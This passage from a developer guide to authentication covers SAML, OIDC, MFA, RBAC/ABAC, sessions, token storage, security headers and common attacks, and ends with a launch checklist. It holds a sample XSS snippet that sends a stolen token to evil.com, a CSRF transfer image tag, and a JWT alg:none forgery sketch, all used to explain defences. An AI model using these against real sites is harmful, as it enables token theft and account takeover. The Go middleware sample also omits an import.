<samlp:Response>
  <Assertion>
    <Issuer>https://idp.company.com</Issuer>
    <Conditions NotBefore="..." NotOnOrAfter="...">
      <AudienceRestriction>
        <Audience>https://app.mycompany.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AttributeStatement>
      <Attribute Name="email"><AttributeValue>alice@company.com</AttributeValue></Attribute>
      <Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
      <Attribute Name="department"><AttributeValue>Engineering</AttributeValue></Attribute>
    </AttributeStatement>
    <Signature> <!-- RSA signature by IdP's private key --> </Signature>
  </Assertion>
</samlp:Response>
```

### SAML vs OIDC

| | SAML 2.0 | OIDC |
|---|---|---|
| **Format** | XML | JSON / JWT |
| **Complexity** | High | Lower |
| **Mobile support** | Poor (browser-dependent) | Excellent |
| **Typical use** | Enterprise SSO, legacy apps | Modern web, mobile, APIs |
| **Providers** | Okta, ADFS, Ping, OneLogin, Azure AD | Google, GitHub, Auth0, Okta, Azure AD |
| **Token type** | XML Assertion | JSON ID Token + Access Token |
| **Age** | 2005 | 2014 |

**Choose OIDC** for new projects. Use SAML only when required by enterprise customers with legacy IdPs.

---

## 13. MFA Protocols Deep Dive

### TOTP vs HOTP

| | TOTP (RFC 6238) | HOTP (RFC 4226) |
|---|---|---|
| **Based on** | Current time (30-second windows) | Incrementing counter |
| **Algorithm** | `HMAC-SHA1(secret, ⌊time/30⌋)` | `HMAC-SHA1(secret, counter)` |
| **Expiry** | Every 30 seconds | One-use, no time limit |
| **Sync issue** | Clock skew (±1 window tolerance) | Counter desync if codes generated unused |
| **Apps** | Google Authenticator, Authy, 1Password | YubiKey OTP (HOTP mode) |

### FIDO U2F vs FIDO2

| | FIDO U2F | FIDO2 / WebAuthn |
|---|---|---|
| **Year** | 2014 | 2019 |
| **Device** | Hardware key (Yubikey, etc.) | Hardware key OR platform authenticator |
| **Platform authenticators** | No | Yes (Touch ID, Face ID, Windows Hello) |
| **Passwordless** | No (used as second factor) | Yes (can replace password entirely) |
| **Sync across devices** | No | Yes (synced passkeys via cloud) |

### Push Authentication (Duo, Okta Verify)

```
1. User enters username + password on app
2. App → Auth server: validate credentials
3. Auth server → User's phone: send push notification
4. User → Phone: tap Approve (with optional biometric)
5. Phone → Auth server: approval signal (signed)
6. Auth server → App: access granted
```

**Weakness:** Push fatigue attacks — attacker repeatedly sends push notifications hoping user accidentally taps Approve. Mitigated by number matching (show a number on login screen that user must match in push).

### SMS OTP — Why It's Weak

1. **SIM swap:** Attacker convinces carrier to transfer phone number to their SIM
2. **SS7 attacks:** Protocol vulnerabilities allow interception of SMS
3. **Malware:** Malicious apps with SMS permission can read OTPs
4. **Social engineering:** Support staff tricked into sending codes

NIST SP 800-63B no longer recommends SMS OTP for new implementations. Use TOTP apps or FIDO2 instead.

---

## 14. Protocol Reference

| Protocol | Layer | Purpose | Best For |
|---|---|---|---|
| **OAuth 2.0** | Authorization | Delegated resource access | API access, third-party integrations |
| **OIDC** | Authentication + Authorization | Identity + token | "Sign in with" flows, modern SSO |
| **SAML 2.0** | Authentication + Authorization | Enterprise federation | Corporate SSO, B2B integrations |
| **LDAP** | Directory | User directory lookup | On-premises enterprise, AD integration |
| **Kerberos** | Authentication | Ticket-based mutual auth | Windows domains, internal enterprise |
| **FIDO2 / WebAuthn** | Authentication | Passwordless public-key | Consumer passkeys, phishing resistance |
| **SCIM** | Provisioning | User/group synchronization | Auto-provisioning between IdP and SP |
| **JWT (RFC 7519)** | Token format | Claims bearer | Token encoding for all of the above |
| **JWK / JWKS** | Key material | Public key distribution | Key rotation, OIDC/OAuth key endpoints |
| **mTLS** | Transport | Mutual certificate auth | Zero trust, service mesh, B2B APIs |

### Important Endpoints

```
OIDC discovery:      /.well-known/openid-configuration
OAuth token:         /oauth/token  or  /token
OAuth authorize:     /oauth/authorize  or  /authorize
OAuth revoke:        /oauth/revoke
JWKS:                /.well-known/jwks.json
Userinfo:            /userinfo
SAML SSO:            /sso/saml  (varies by IdP)
SAML ACS:            /auth/saml/callback  (your app)
```

---

## 15. RBAC & ABAC

### Role-Based Access Control (RBAC)

Users are assigned roles; roles have permissions. Simple, auditable, widely understood.

```
alice  →  role: admin    →  permissions: [read, write, delete, manage_users]
bob    →  role: editor   →  permissions: [read, write]
carol  →  role: viewer   →  permissions: [read]
```

**RBAC in Node.js/Express:**
```javascript
// Define roles and their permissions
const PERMISSIONS = {
  admin:  ['read', 'write', 'delete', 'manage_users', 'billing'],
  editor: ['read', 'write'],
  viewer: ['read'],
};

// Middleware factory — requires a specific permission
const requirePermission = (permission) => (req, res, next) => {
  const role = req.user?.role;  // from JWT claim or session
  const allowed = PERMISSIONS[role] ?? [];

  if (!allowed.includes(permission)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

// Usage
app.get('/reports', requirePermission('read'), getReports);
app.post('/reports', requirePermission('write'), createReport);
app.delete('/users/:id', requirePermission('manage_users'), deleteUser);
```

**RBAC in Python/FastAPI:**
```python
from enum import Enum
from fastapi import Depends, HTTPException

class Role(str, Enum):
    admin = "admin"
    editor = "editor"
    viewer = "viewer"

PERMISSIONS = {
    Role.admin:  {"read", "write", "delete", "manage_users"},
    Role.editor: {"read", "write"},
    Role.viewer: {"read"},
}

def require_permission(permission: str):
    def checker(user = Depends(get_current_user)):
        if permission not in PERMISSIONS.get(user.role, set()):
            raise HTTPException(status_code=403, detail="Forbidden")
        return user
    return checker

@app.delete("/users/{user_id}")
async def delete_user(user_id: str, _=Depends(require_permission("manage_users"))):
    ...
```

### Attribute-Based Access Control (ABAC)

More flexible than RBAC — access decisions are based on attributes of the subject (user), resource, action, and environment. Enables fine-grained, context-aware policies.

```
Policy: Allow access if:
  subject.department == resource.owner_department
  AND subject.clearance_level >= resource.classification
  AND environment.time is within business_hours
  AND action == "read"
```

**ABAC example:**
```javascript
function isAuthorized(subject, resource, action, environment) {
  // Department-based access
  if (subject.department !== resource.ownerDepartment) return false;

  // Clearance level check
  if (subject.clearanceLevel < resource.classificationLevel) return false;

  // Time-based restriction
  const hour = new Date(environment.timestamp).getHours();
  if (hour < 8 || hour > 18) return false;

  // Action whitelist for this resource type
  const allowedActions = resourceActions[resource.type] ?? [];
  if (!allowedActions.includes(action)) return false;

  return true;
}
```

### RBAC vs ABAC

| | RBAC | ABAC |
|---|---|---|
| **Complexity** | Simple | Complex |
| **Flexibility** | Lower (role boundaries) | Very high (any attribute combination) |
| **Auditability** | Easy (roles are clear) | Harder (many policy conditions) |
| **Best for** | Most apps; clear role boundaries | Complex orgs; context-sensitive access |
| **Example tools** | Casbin, built-in middleware | OPA (Open Policy Agent), AWS IAM |

---

## 16. Permissions & Scopes

### Permission Modeling

Use the `resource:action` pattern for consistent, readable permissions:

```
# Read permissions
users:read         → List or get user records
invoices:read      → View invoices
reports:read       → View reports

# Write permissions
users:write        → Create or update users
invoices:write     → Create or update invoices

# Delete permissions
users:delete       → Delete users
invoices:delete    → Delete invoices

# Special permissions
admin:impersonate  → Act as another user (high-privilege — always log)
billing:manage     → Manage billing/subscription
settings:admin     → Modify application settings
```

### JWT with Permissions

```json
{
  "sub": "user_abc123",
  "email": "alice@company.com",
  "roles": ["editor", "billing_viewer"],
  "permissions": ["users:read", "invoices:read", "invoices:write"],
  "scope": "openid email read:reports write:reports",
  "org_id": "org_xyz",
  "exp": 1700003600
}
```

### Scope Validation in Code

```javascript
// Middleware: require a specific OAuth scope
const requireScope = (scope) => (req, res, next) => {
  const tokenScopes = (req.user.scope || '').split(' ');
  if (!tokenScopes.includes(scope)) {
    return res.status(403).json({
      error: 'insufficient_scope',
      error_description: `Required scope: ${scope}`,
    });
  }
  next();
};

app.get('/reports', requireScope('read:reports'), getReports);
app.post('/reports', requireScope('write:reports'), createReport);
```

### Resource Ownership Check (prevents IDOR)

```javascript
app.get('/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);

  if (!invoice) return res.status(404).json({ error: 'Not found' });

  // CRITICAL: always check ownership — never trust the ID alone
  if (invoice.userId !== req.user.sub) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(invoice);
});
```

---

## 17. Zero Trust Architecture

### Old Model vs Zero Trust

**Old "castle and moat" model:**
```
Outside network: UNTRUSTED (block everything)
Inside network:  TRUSTED   (allow everything)
```
Problem: Once an attacker is inside (via phishing, VPN compromise, etc.), they can move laterally to any resource.

**Zero Trust model:**
```
Never trust. Always verify. Regardless of network location.
```

### Zero Trust Principles

1. **Verify explicitly** — Always authenticate and authorize using all available data: identity, location, device health, service, workload, data classification, anomalies

2. **Least-privilege access** — Limit access with just-in-time (JIT) and just-enough-access (JEA). Time-box elevated permissions.

3. **Assume breach** — Minimize blast radius. Segment everything. Encrypt all traffic. Use analytics to detect anomalies.

### Zero Trust in Practice

```
Network:  Micro-segmentation — services can only talk to declared dependencies
Identity: Every request carries a verified identity token
Devices:  Device health checked before granting access (MDM, certificate)
Apps:     mTLS between all services in a service mesh
Data:     Encrypt at rest and in transit; classify and label data
Logging:  All access events logged; real-time anomaly detection
```

### Service Mesh with mTLS

```yaml
# Istio PeerAuthentication — enforce mTLS for all services
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # reject plaintext connections

# Authorization policy — only allow specific services to call each other
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payments-policy
spec:
  selector:
    matchLabels:
      app: payments-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/orders-service"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/payments/*"]
```

---

## 18. Auth in Code

### Express.js — Complete Auth Middleware

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

const client = jwksClient({
  jwksUri: `${process.env.AUTH_ISSUER}/.well-known/jwks.json`,
  cache: true,
  cacheMaxEntries: 5,
  cacheMaxAge: 10 * 60 * 1000, // 10 minutes
});

async function getPublicKey(header) {
  return new Promise((resolve, reject) => {
    client.getSigningKey(header.kid, (err, key) => {
      if (err) reject(err);
      else resolve(key.getPublicKey());
    });
  });
}

async function authenticate(req, res, next) {
  const authHeader = req.headers['authorization'];

  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing or invalid Authorization header' });
  }

  const token = authHeader.slice(7);

  try {
    const decoded = jwt.decode(token, { complete: true });
    if (!decoded) return res.status(401).json({ error: 'Malformed token' });

    const publicKey = await getPublicKey(decoded.header);

    req.user = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],        // explicit allowlist
      audience: process.env.API_AUDIENCE,
      issuer: process.env.AUTH_ISSUER,
    });

    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}

module.exports = { authenticate };
```

### FastAPI (Python)

```python
import os
from datetime import datetime, timedelta
from typing import Optional
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import JWTError, jwt
from passlib.context import CryptContext
from pydantic import BaseModel

SECRET_KEY = os.environ["JWT_SECRET"]
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 15

pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/auth/token")


class TokenData(BaseModel):
    sub: Optional[str] = None
    roles: list[str] = []


def verify_password(plain: str, hashed: str) -> bool:
    return pwd_context.verify(plain, hashed)


def create_access_token(data: dict) -> str:
    payload = data.copy()
    payload["exp"] = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    payload["iat"] = datetime.utcnow()
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)


async def get_current_user(token: str = Depends(oauth2_scheme)) -> TokenData:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token, SECRET_KEY,
            algorithms=[ALGORITHM],
            audience="myapi"
        )
        user_id: str = payload.get("sub")
        if user_id is None:
            raise credentials_exception
        return TokenData(sub=user_id, roles=payload.get("roles", []))
    except JWTError:
        raise credentials_exception


@app.post("/auth/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    user = await get_user(form_data.username)
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(status_code=401, detail="Incorrect username or password")
    token = create_access_token({"sub": user.id, "roles": user.roles})
    return {"access_token": token, "token_type": "bearer"}


@app.get("/me")
async def read_me(user: TokenData = Depends(get_current_user)):
    return user
```

### Go — HTTP Auth Middleware

```go
package middleware

import (
    "context"
    "net/http"
    "strings"

    "github.com/golang-jwt/jwt/v5"
)

type contextKey string
const UserKey contextKey = "user"

type Claims struct {
    Sub   string   `json:"sub"`
    Email string   `json:"email"`
    Roles []string `json:"roles"`
    jwt.RegisteredClaims
}

func AuthMiddleware(publicKey interface{}) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            authHeader := r.Header.Get("Authorization")
            if !strings.HasPrefix(authHeader, "Bearer ") {
                http.Error(w, `{"error":"missing token"}`, http.StatusUnauthorized)
                return
            }

            tokenStr := authHeader[7:]
            claims := &Claims{}

            token, err := jwt.ParseWithClaims(tokenStr, claims, func(t *jwt.Token) (interface{}, error) {
                if _, ok := t.Method.(*jwt.SigningMethodRSA); !ok {
                    return nil, fmt.Errorf("unexpected signing method: %v", t.Header["alg"])
                }
                return publicKey, nil
            }, jwt.WithAudience("myapi"), jwt.WithIssuer("https://auth.myapp.com"))

            if err != nil || !token.Valid {
                http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
                return
            }

            ctx := context.WithValue(r.Context(), UserKey, claims)
            next.ServeHTTP(w, r.WithContext(ctx))
        })
    }
}

// Usage in handler
func GetUser(w http.ResponseWriter, r *http.Request) {
    claims := r.Context().Value(UserKey).(*Claims)
    // claims.Sub, claims.Email, claims.Roles
}
```

---

## 19. Sessions & Cookies

### Session-Based Authentication

In session-based auth, user data lives on the server. The browser holds only a session ID (a random string) in a cookie.

```
Login:
  1. User sends credentials
  2. Server validates, creates session: sessions["sess_abc123"] = { userId: "123", role: "admin", createdAt: ... }
  3. Server sets cookie: Set-Cookie: session=sess_abc123; HttpOnly; Secure; SameSite=Lax

Subsequent requests:
  1. Browser automatically sends: Cookie: session=sess_abc123
  2. Server looks up sessions["sess_abc123"] → gets user data
  3. Request proceeds as authenticated

Logout:
  1. Server deletes session: delete sessions["sess_abc123"]
  2. Server clears cookie: Set-Cookie: session=; Max-Age=0
```

### Cookie Security Attributes

| Attribute | Value | Effect |
|---|---|---|
| `HttpOnly` | (flag) | JavaScript cannot access `document.cookie`. **Prevents XSS token theft.** Always set. |
| `Secure` | (flag) | Cookie only sent over HTTPS. **Prevents interception over HTTP. Always set in production.** |
| `SameSite=Strict` | Strict | Cookie never sent in cross-site requests. Maximum CSRF protection. May break cross-origin OAuth flows. |
| `SameSite=Lax` | Lax | Sent on same-site requests + top-level navigations (GET). **Recommended default.** Breaks most CSRF attacks. |
| `SameSite=None` | None | Sent in all contexts (cross-site). Required for third-party cookies. Must also set `Secure`. |
| `Max-Age` | Seconds | Persistent cookie — survives browser close. `Max-Age=0` deletes cookie. |
| `Expires` | Date | Alternative to Max-Age. Prefer Max-Age (relative, not clock-dependent). |
| `Domain` | domain.com | Which hosts receive the cookie. Omit to restrict to exact hostname. |
| `Path` | /path | Restrict cookie to a URL path. Use `/` for app-wide. |

**Recommended session cookie:**
```http
Set-Cookie: session=sess_abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/
```

### Session vs JWT

| | Server Session | JWT (Stateless) |
|---|---|---|
| **Data location** | Server (Redis, database) | Inside the token (client) |
| **Revocation** | Instant — delete session | Hard — must wait for expiry or use allowlist |
| **Scalability** | Requires shared session store | Scales horizontally without shared state |
| **Cookie size** | Tiny (just a random ID) | Large (100–500+ bytes) |
| **Inspection** | Requires DB lookup | Decoded anywhere (but tampering detected) |
| **Best for** | Traditional web apps, admin panels | APIs, microservices, distributed systems |

### Session Management Code

**Node.js with express-session + Redis:**
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // rotate periodically
  name: 'sid',                          // don't leak 'connect.sid' default
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  },
}));

// Login
app.post('/auth/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  // Regenerate session ID on login to prevent session fixation
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ success: true });
  });
});

// Logout
app.post('/auth/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('sid');
    res.json({ success: true });
  });
});
```

---

## 20. Token Storage

Choosing where to store tokens in the browser involves security tradeoffs between XSS and CSRF risks.

### Storage Options Compared

| Storage | XSS Risk | CSRF Risk | Persists | Verdict |
|---|---|---|---|---|
| `localStorage` | ❌ High — any script can read | ✅ Low — not auto-sent | ✅ Yes | ❌ Avoid for sensitive tokens |
| `sessionStorage` | ❌ High — same as localStorage | ✅ Low | ❌ No (tab close) | ❌ Avoid for sensitive tokens |
| `HttpOnly Cookie` | ✅ None — JS can't access | ❌ High — auto-sent | ✅ Optional | ✅ Use for refresh tokens |
| `JS memory (variable)` | ✅ Low — not accessible cross-script | ✅ Low | ❌ No (page reload) | ✅ Best for access tokens |
| `Service Worker` | ✅ Good isolation | ✅ Low | ❌ No | ✅ Advanced SPA option |
| `IndexedDB` | ❌ High — JS-accessible | ✅ Low | ✅ Yes | ❌ Avoid for auth tokens |

### Recommended Pattern (SPAs)

```
Access token:   Store in memory (JS variable) — short lived (15 min)
                ↓ lost on page reload, but...
Refresh token:  Store in HttpOnly Secure SameSite=Lax cookie
                ↓ used to silently get new access tokens on reload

On page load:   Call /auth/refresh silently
                ← new access token returned in response body
                ← store in memory variable
                ← refresh token cookie rotated automatically
```

```javascript
// auth.js
let accessToken = null;

export async function initAuth() {
  // Silent refresh on page load — uses HttpOnly cookie automatically
  try {
    const res = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include', // send HttpOnly cookie
    });
    if (res.ok) {
      const data = await res.json();
      accessToken = data.access_token;
    }
  } catch {
    // User not authenticated
  }
}

export function getAccessToken() {
  return accessToken;
}

export async function logout() {
  await fetch('/auth/logout', { method: 'POST', credentials: 'include' });
  accessToken = null;
}
```

### Why NOT localStorage

```javascript
// Attacker injects this script via XSS:
const token = localStorage.getItem('access_token');
await fetch('https://evil.com/steal', {
  method: 'POST',
  body: token, // token exfiltrated
});

// With HttpOnly cookie: this script cannot access the token at all.
```

---

## 21. HTTP Security Headers

Security headers instruct the browser on how to protect users. They are free to implement and critical for defense-in-depth.

### Essential Headers

| Header | Recommended Value | Purpose |
|---|---|---|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | Forces HTTPS for 2 years. Prevents SSL stripping. |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'nonce-{n}'` | Restricts resource loading. Prevents XSS. |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevents clickjacking via iframes. |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME type sniffing attacks. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls Referer header leakage. |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Disables browser features you don't need. |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolates browsing context from cross-origin windows. |
| `Cross-Origin-Embedder-Policy` | `require-corp` | Enables SharedArrayBuffer; required for isolation. |

### Adding Headers in Code

**Express.js (using Helmet):**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.myapp.com'],
    },
  },
  hsts: {
    maxAge: 63072000,
    includeSubDomains: true,
    preload: true,
  },
}));
```

**Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

### CSP Nonce Pattern (prevents inline script injection)

```javascript
// Generate a unique nonce per request
app.use((req, res, next) => {
  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');
  next();
});

// Set CSP with nonce
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; default-src 'self'`
  );
  next();
});

// In HTML template — only scripts with the correct nonce execute
// <script nonce="<%= nonce %>">...</script>
// Injected scripts (via XSS) don't have the nonce and are blocked.
```

---

## 22. Threats & Attacks

### Credential-Based Attacks

#### Phishing
**What:** Fake login pages that steal credentials. Modern kits (Evilginx2) also relay 2FA codes in real-time.
**Defense:** Passkeys (FIDO2) — keys are domain-bound; browser will not use them on a fake domain. Security keys (U2F) for second factor.

#### Credential Stuffing
**What:** Billions of leaked username/password pairs exist from data breaches. Attackers run them against your login endpoint. Hit rates of 0.1–2% are devastating at scale.
**Defense:** MFA on all accounts, rate limiting, IP reputation, breach detection API (HaveIBeenPwned), device fingerprinting, anomaly detection.

#### Brute Force
**What:** Systematic guessing of passwords or PINs. Distributed attacks use thousands of IPs to bypass simple IP rate limiting.
**Defense:** Exponential backoff, account lockout after N attempts, CAPTCHA, device fingerprinting, long random passwords.

#### Password Spraying
**What:** Reverse of brute force — try one common password (e.g., `Password123!`) against many accounts. Avoids per-account lockout.
**Defense:** Strong password policy, MFA, anomaly detection for cross-account failures.

### Token Attacks

#### JWT "alg:none" Attack
**What:** If the server accepts the algorithm from the token header, an attacker sets `"alg":"none"` and removes the signature. The token validates with no cryptographic check.
```
Before: {"alg":"RS256"}.<payload>.<valid_signature>
After:  {"alg":"none"}.<modified_payload>.  ← empty signature accepted
```
**Defense:** Always specify an explicit algorithm allowlist in `jwt.verify()`. Never accept `none`.

#### JWT Algorithm Confusion
**What:** RS256 → HS256 confusion. If the server has an RS256 key pair, an attacker signs a JWT with HS256 using the public key (which is public!) as the HMAC secret.
**Defense:** Explicitly whitelist allowed algorithms. Use separate secrets/keys per algorithm type.

#### Token Leakage
**What:** JWT tokens stored in `localStorage` or URL parameters leak via XSS, browser history, Referer headers, or server logs.
**Defense:** HttpOnly cookies for refresh tokens, memory storage for access tokens, never put tokens in URLs.

#### Replay Attacks
**What:** An attacker captures a valid token or signed request and replays it later.
**Defense:** Short `exp` on access tokens, `jti` claim for one-time tokens, nonce in authentication flows, request timestamps.

### Session Attacks

#### Session Hijacking
**What:** Attacker steals a session cookie via XSS, network sniffing, or log leakage.
**Defense:** HttpOnly + Secure + SameSite cookies, HTTPS only, regenerate session ID on privilege changes.

#### Session Fixation
**What:** Attacker tricks a user into using a known session ID. After login, the attacker knows the session.
**Defense:** Always regenerate session ID on successful login (`req.session.regenerate()`).

#### CSRF (Cross-Site Request Forgery)
**What:** A malicious website causes the victim's browser to make authenticated requests to your app by exploiting automatic cookie sending.
```html
<!-- Victim visits evil.com; this triggers a state change on your app -->
<img src="https://myapp.com/transfer?to=attacker&amount=1000">
```
**Defense:** `SameSite=Lax` or `Strict` cookies, CSRF tokens (double-submit cookie pattern), custom request headers (simple requests can't set custom headers cross-origin).

### Application Attacks

#### IDOR (Insecure Direct Object Reference)
**What:** API uses client-supplied IDs without authorization checks. User changes `/api/orders/123` to `/api/orders/124` and accesses another user's data.
**Defense:** Always check resource ownership in authorization layer. Never trust IDs alone.

#### Privilege Escalation
**What:** User gains higher permissions than intended — vertical (user → admin) or horizontal (access another user's data).
**Defense:** Least-privilege principle, server-side authorization on every request, re-authentication for sensitive actions.

#### Open Redirect in OAuth
**What:** Unvalidated `redirect_uri` in OAuth flow lets attacker redirect authorization codes to their server.
**Defense:** Exact-match `redirect_uri` allowlist on the auth server. Never accept wildcard or partial matches.

### Infrastructure Attacks

#### SIM Swap
**What:** Attacker social-engineers mobile carrier to transfer victim's phone number to attacker's SIM. All SMS OTPs now go to attacker.
**Defense:** Use TOTP apps or hardware keys instead of SMS 2FA. Account-level protection with carriers (SIM lock).

#### Supply Chain Attack
**What:** Malicious code in a dependency (npm package, GitHub Action) exfiltrates credentials.
**Defense:** Lock dependency versions, audit package.json regularly, use private registries, Dependabot/Renovate.

#### Secrets in Git
**What:** Developer accidentally commits API keys, private keys, or passwords to a public (or private) repository.
**Defense:** Pre-commit hooks (git-secrets, trufflehog), `.gitignore` for `.env` files, GitHub secret scanning, secret rotation on exposure.

---

## 23. Best Practices

### Always Do This

- **Hash passwords with Argon2id, bcrypt (cost ≥ 12), or scrypt** — never plaintext, never MD5/SHA
- **Enforce HTTPS everywhere** — auth over plain HTTP is meaningless
- **Use short-lived access tokens (5–60 min)** with long-lived refresh tokens
- **Validate JWT algorithm, issuer, audience, and expiry** explicitly on every request
- **Set HttpOnly + Secure + SameSite=Lax** on all session/auth cookies
- **Rate-limit authentication endpoints** with exponential backoff and account lockout
- **Enforce MFA** — prefer TOTP apps or hardware keys over SMS
- **Log all auth events** — success, failure, token issuance, revocation, with IP + user agent
- **Rotate secrets on breach** — support key rotation without service downtime
- **Verify email before allowing account use** — prevents account enumeration and takeover
- **Regenerate session ID on login** — prevents session fixation
- **Apply least-privilege** to all tokens, keys, API credentials, and service accounts
- **Use a secrets manager** (HashiCorp Vault, AWS Secrets Manager, Doppler) — not environment variables in code
- **PKCE for all OAuth Authorization Code flows** — even for confidential clients

### Never Do This

- Store plaintext passwords — ever
- Use MD5, SHA-1, or unsalted hashes for passwords
- Build your own cryptographic primitives — use vetted libraries
- Trust the `alg` header in a JWT — explicitly allowlist algorithms
- Store sensitive tokens in `localStorage` — XSS will steal them
- Commit secrets, API keys, or credentials to version control
- Use the same secret across dev, staging, and production environments
- Rely solely on SMS OTP for high-value accounts
- Include stack traces or error details in 401/403 responses — they leak information
- Trust client-side authorization checks as the only enforcement layer
- Put sensitive data (PII, secrets) in JWT payload without encryption
- Transmit credentials or tokens in URL query parameters
- Return `200 OK` for failed authentication — use proper 4xx codes
- Use `GET` requests for state-changing operations — CSRF bypasses SameSite protections

---

## 24. Security Checklist

Use this before launching any system with authentication.

### Passwords & Credentials

- [ ] Passwords hashed with Argon2id or bcrypt (cost ≥ 12)
- [ ] Minimum password length ≥ 12 characters
- [ ] Common/breached passwords blocked (HaveIBeenPwned integration)
- [ ] Password change requires current password re-entry
- [ ] Secure password reset — time-limited tokens (≤ 1 hour), single-use, no security questions
- [ ] Account enumeration prevented — same response for "user not found" and "wrong password"

### Transport & Encryption

- [ ] HTTPS enforced everywhere, including all subdomains
- [ ] HSTS header set with `max-age=63072000; includeSubDomains; preload`
- [ ] TLS 1.2+ only — TLS 1.0/1.1 disabled
- [ ] Strong cipher suites — no RC4, DES, 3DES, export-grade ciphers
- [ ] Certificate validity monitored — alert 30 days before expiry
- [ ] HTTP → HTTPS redirect in place

### Tokens & Sessions

- [ ] Session IDs generated with CSPRNG — minimum 128 bits entropy
- [ ] Session regenerated on login, logout, and privilege changes
- [ ] Sessions server-side invalidated on logout (not just cookie cleared)
- [ ] JWT `alg` explicitly allowlisted — `none` rejected
- [ ] JWT `iss`, `aud`, `exp` validated on every request
- [ ] Access tokens have short TTL (≤ 60 minutes)
- [ ] Refresh token rotation — new refresh token on every use
- [ ] Token revocation mechanism exists for critical tokens

### Cookies

- [ ] All auth cookies have `HttpOnly` flag
- [ ] All auth cookies have `Secure` flag
- [ ] `SameSite=Lax` or `Strict` set
- [ ] Cookie `Path` scoped appropriately
- [ ] No sensitive data in cookie values (only IDs/tokens)

### Headers & CSP

- [ ] `Content-Security-Policy` header set and tested
- [ ] `X-Frame-Options: DENY` or CSP `frame-ancestors`
- [ ] `X-Content-Type-Options: nosniff`
- [ ] `Referrer-Policy: strict-origin-when-cross-origin`
- [ ] `Permissions-Policy` restricts unused browser features
- [ ] Security headers tested with [securityheaders.com](https://securityheaders.com)

### Rate Limiting & Monitoring

- [ ] Login endpoint rate-limited per IP and per account
- [ ] Account lockout after N failed attempts with unlock flow
- [ ] CAPTCHA for high-volume or suspicious activity
- [ ] All auth events logged with timestamp, IP, user agent, outcome
- [ ] Alerts on anomalies (unusual location, many failures, impossible travel)
- [ ] Intrusion detection for credential stuffing patterns

### API & Keys

- [ ] API keys hashed in database — never stored in plaintext
- [ ] Keys shown to user only at creation — never again
- [ ] Keys have scopes — not all-or-nothing
- [ ] Keys can be revoked individually
- [ ] No secrets in source code or committed `.env` files
- [ ] Secrets stored in a secrets manager
- [ ] `.env.example` in repo (not `.env`)
- [ ] Secret scanning enabled on repository (GitHub, GitLab)

### OAuth / OIDC

- [ ] `redirect_uri` validated against exact-match allowlist
- [ ] `state` parameter used and validated (CSRF protection)
- [ ] PKCE enabled for Authorization Code flow
- [ ] `nonce` used in OIDC flows and validated
- [ ] Minimum required scopes requested
